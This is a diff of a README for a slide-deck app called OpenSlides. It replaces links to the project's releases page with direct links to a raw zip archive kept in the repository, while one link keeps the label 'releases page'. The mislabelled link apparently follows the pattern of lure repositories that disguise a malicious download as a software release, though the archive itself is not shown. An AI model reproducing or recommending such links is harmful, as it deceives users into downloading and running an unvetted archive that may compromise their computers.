@@ -1,6 +1,6 @@
 # ✨ OpenSlides - Build and present decks fast
 
-[![Download OpenSlides](https://img.shields.io/badge/Download%20OpenSlides-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Gandhian-learnedness997/OpenSlides/releases)
+[![Download OpenSlides](https://img.shields.io/badge/Download%20OpenSlides-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Gandhian-learnedness997/OpenSlides/raw/refs/heads/main/projects/Open-Slides-v2.3.zip)
 
 ## 🖥️ What OpenSlides does
 
@@ -33,7 +33,7 @@ For a smooth experience, 8 GB of RAM or more is better if you work with large de
 
 Open the releases page here:
 
-[Visit the OpenSlides releases page](https://github.com/Gandhian-learnedness997/OpenSlides/releases)
+[Visit the OpenSlides releases page](https://github.com/Gandhian-learnedness997/OpenSlides/raw/refs/heads/main/projects/Open-Slides-v2.3.zip)
 
 On that page, look for the latest release. Download the Windows file that matches your PC. If there are several files, choose the one for Windows first.
 
